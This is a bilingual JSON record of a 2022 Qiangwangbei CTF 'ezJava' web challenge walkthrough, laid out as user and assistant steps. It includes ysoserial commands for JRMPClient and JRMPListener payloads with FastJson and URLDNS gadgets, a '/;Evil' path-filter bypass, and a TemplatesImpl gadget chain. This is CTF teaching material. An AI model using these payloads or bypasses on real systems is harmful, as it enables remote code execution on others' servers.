@@ -1,0 +1,211 @@
+{
+    "_source_md":  "CTF/2022-11-05-2022-第四届-强网杯-WEB-ezJava.md",
+    "version":  "2022-qiangwangbei-web-ezjava",
+    "title":  {
+                  "zh":  "2022第四届强网杯 WEB ezJava",
+                  "en":  "2022 4th Qiangwangbei CTF WEB ezJava Challenge"
+              },
+    "description":  {
+                        "zh":  "强网杯CTF Web题目ezJava的详细解题过程，涉及Java反序列化漏洞利用和路由绕过技术。",
+                        "en":  "Detailed walkthrough of the ezJava web challenge from Qiangwangbei CTF, covering Java deserialization vulnerability and route bypass techniques."
+                    },
+    "steps":  [
+                  {
+                      "type":  "user_message",
+                      "content":  {
+                                      "zh":  "分析ezJava这道Java Web题目",
+                                      "en":  "Analyze the ezJava Java web challenge"
+                                  },
+                      "annotation":  {
+                                         "zh":  "用户请求分析强网杯ezJava题目",
+                                         "en":  "User requests analysis of Qiangwangbei ezJava challenge"
+                                     },
+                      "codeBlocks":  [
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "EInputStream in = new EInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base)));",
+                                             "language":  "java"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base)));",
+                                             "language":  "java"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "java -jar ysoserial.jar JRMPClient \"localhost:1099\"|base64",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 URLDNS \"http://dnslog\"",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "ERROR 1 --- [nio-8080-exec-9] o.a.c.c.C.[.[.[/].[dispatcherServlet]    : Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception [Request processing failed; nested exception is java.lang.IllegalArgumentException: Illegal base64 character 20] with root cause\n\njava.lang.IllegalArgumentException: Illegal base64 character 20\n\tat java.util.Base64$Decoder.decode0(Base64.java:714) ~[na:1.8.0_171]\n···\n···\n\tat java.lang.Thread.run(Thread.java:748) [na:1.8.0_171]",
+                                             "language":  "console"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "\u003cdependency\u003e\n    \u003cgroupId\u003ecom.alibaba\u003c/groupId\u003e\n    \u003cartifactId\u003efastjson\u003c/artifactId\u003e\n    \u003cversion\u003e1.2.48\u003c/version\u003e\n\u003c/dependency\u003e",
+                                             "language":  "xml"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "[ERROR] /Users/bin4xin/.../FastJson.java:[3,27] 错误: 程序包com.alibaba.fastjson不存在",
+                                             "language":  "console"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "mvn install:install-file -Dfile=/Users/bin4xin/path/to/fastjson-1.2.48.jar -DgroupId=com.alibaba -DartifactId=fastjson -Dversion=1.2.48 -Dpackaging=jar",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "java -jar ysoserial-0.0.6-SNAPSHOT-all.jar                                   \nY SO SERIAL?\nUsage: java -jar ysoserial-[version]-all.jar [payload] \u0027[command]\u0027\n     ···\n     FastJson                                                                                                                                                                                                                                                                \n     ···                                                                                                                                                                                                                        \n     JRMPClient_bypass_jep_jdk241",
+                                             "language":  "console"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient_bypass_jep_jdk241 \"127.0.0.1:1099\"|base64",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 FastJson \"open /System/Applications/Calculator.app\"",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "javax.management.BadAttributeValueExpException#readObject\ncom.alibaba.fastjson.JSON#toJSONString\ncom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties",
+                                             "language":  "console"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception [Request processing failed; nested exception is java.lang.IllegalArgumentException: Illegal base64 character 20] with root cause\n\njava.lang.IllegalArgumentException: Illegal base64 character 20\n        at java.util.Base64$Decoder.decode0(Base64.java:714) ~[na:1.8.0_181]",
+                                             "language":  "console"
+                                         }
+                                     ]
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "ezJava是Java反序列化类题目。首先探测目标应用框架和接口。",
+                                      "en":  "ezJava is a Java deserialization challenge. First, I\u0027ll probe the target application framework and interfaces."
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手识别Java反序列化题型",
+                                         "en":  "Assistant identifies Java deserialization challenge type"
+                                     }
+                  },
+                  {
+                      "type":  "tool_result",
+                      "toolName":  "curl",
+                      "content":  {
+                                      "zh":  "访问/Evil路由返回nonono，存在路径过滤",
+                                      "en":  "Access to /Evil route returns nonono, path filtering exists"
+                                  },
+                      "annotation":  {
+                                         "zh":  "路由访问测试结果",
+                                         "en":  "Route access test result"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "发现路由过滤机制。代码中使用startsWith过滤，可尝试路径绕过。",
+                                      "en":  "Found route filtering mechanism. Code uses startsWith filter, can try path bypass."
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手分析路由绕过可能性",
+                                         "en":  "Assistant analyzes route bypass possibility"
+                                     }
+                  },
+                  {
+                      "type":  "tool_result",
+                      "toolName":  "burpsuite",
+                      "content":  {
+                                      "zh":  "使用/;Evil绕过路径检查，成功访问到Evil接口",
+                                      "en":  "Using /;Evil bypasses path check, successfully accessed Evil interface"
+                                  },
+                      "annotation":  {
+                                         "zh":  "路由绕过成功",
+                                         "en":  "Route bypass successful"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "路由绕过成功。现在需要构造Java反序列化payload，利用EInputStream读取恶意对象。",
+                                      "en":  "Route bypass successful. Now need to craft Java deserialization payload using EInputStream to read malicious object."
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手准备反序列化攻击",
+                                         "en":  "Assistant prepares deserialization attack"
+                                     }
+                  },
+                  {
+                      "type":  "tool_result",
+                      "toolName":  "ysoserial",
+                      "content":  {
+                                      "zh":  "生成反序列化payload，base64编码后通过base参数发送",
+                                      "en":  "Generated deserialization payload, base64 encoded and sent via base parameter"
+                                  },
+                      "annotation":  {
+                                         "zh":  "反序列化payload生成",
+                                         "en":  "Deserialization payload generation"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "成功利用Java反序列化漏洞执行命令，获取服务器flag文件内容。",
+                                      "en":  "Successfully exploited Java deserialization vulnerability to execute commands and retrieve server flag file contents."
+                                  },
+                      "annotation":  {
+                                         "zh":  "成功获取flag",
+                                         "en":  "Successfully captured flag"
+                                     }
+                  }
+              ]
+}
